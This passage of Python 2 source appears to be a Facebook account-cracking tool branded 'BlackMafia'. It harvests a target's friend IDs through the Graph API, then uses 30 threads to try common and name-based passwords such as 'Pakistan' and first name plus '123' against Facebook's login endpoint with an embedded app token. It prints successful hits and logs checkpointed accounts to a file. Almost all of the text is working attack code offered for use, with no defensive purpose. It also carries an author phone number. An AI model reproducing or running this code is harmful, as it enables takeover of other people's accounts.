			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		print"\033[1;93mGetting IDs\033[1;92m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;91mTotal IDs\033[1;93m: \033[1;94m"+str(len(id))
	jalan('\033[1;92mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;92m«--•◈••◈•---\x1b[1;93m•◈•Stop Process Press CTRL+Z•◈•\033[1;92m---•◈••◈•-»"
	print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mKali.linux\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"
	jalan(' \033[1;93m.🔎🔎🔎🔎🔎🔎🔎\033[1;94mCloning Start.....\033[1;93m🔍🔍🔍🔍🔍🔍🔍 ')
	print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mKali.linux\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:love_hacker
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;91mHack💉\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;94mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;91mHack💉\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;94mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mHack💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;97m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;94mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;91mHack💉\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;94mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;91mHack💉\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;94mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Pakistan1'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;91mHack💉\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;94mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;91mHack💉\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;94mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mKali.Linux\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"
	print "  \033[1;93m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
	print '\033[1;91m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 BlackMafia.py)↩\033[1;92m....'
	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;92m"+str(len(cekpoint))
	print """
             
                 ┈┈┈╲┈┈┈┈╱┈┈┈    lovehacker
                 ┈┈┈╱▔▔▔▔╲┈┈┈    BlackMafia
                 ┈┈┃┈▇┈┈▇┈┃┈┈┈WhatsApp
                 ╭╮┣━━━━━━┫╭╮    03094161457
                 ┃┃┃┈┈┈┈┈┈┃┃┃   👆👆👆👆👆👆
                 ╰╯┃┈┈┈┈┈┈┃╰╯    🗝🗝🗝🗝🗝🗝
                 ┈┈╰┓┏━━┓┏╯┈┈   👇👇👇👇👇👇
                 ┈┈┈╰╯┈┈╰╯┈┈┈Checkpoint ID Open After 7 Days

•\033[1;92m◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•.
: \033[1;91m .....lovehacker  Kali.linux........... \033[1;91m :
•\033[1;92m◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•.' 
                WhatsApp Num
              \033[1;93m +923094161457"""
	
	raw_input("\n\033[1;92m[\033[1;91mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
